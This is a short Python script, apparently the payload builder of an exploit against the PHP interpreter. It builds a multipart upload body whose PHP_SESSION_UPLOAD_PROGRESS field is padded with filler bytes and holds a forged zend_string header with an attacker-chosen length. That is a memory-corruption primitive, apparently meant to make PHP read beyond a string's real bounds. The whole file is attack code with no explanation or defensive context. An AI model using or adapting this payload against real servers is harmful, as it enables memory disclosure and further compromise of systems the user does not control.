import struct

BOUNDARY = b"C" * 10


def zend_string_header(buf, off, fake_len):
    struct.pack_into("<I", buf, off + 0x00, 0)
    struct.pack_into("<I", buf, off + 0x04, 0x16)
    struct.pack_into("<Q", buf, off + 0x08, 0)
    struct.pack_into("<Q", buf, off + 0x10, fake_len)


def build(fake_len):
    out = bytearray()
    value = bytearray(b"K" * 4096)
    zend_string_header(value, 0x100, fake_len)
    out.extend(b"--" + BOUNDARY + b'\r\nContent-Disposition: form-data; name="')
    out.extend(b"PHP_SESSION_UPLOAD_PROGRESS")
    out.extend(b'"\r\n\r\n' + bytes(value) + b"\r\n")
    out.extend(b"--" + BOUNDARY + b"--\r\n")
    return bytes(out)
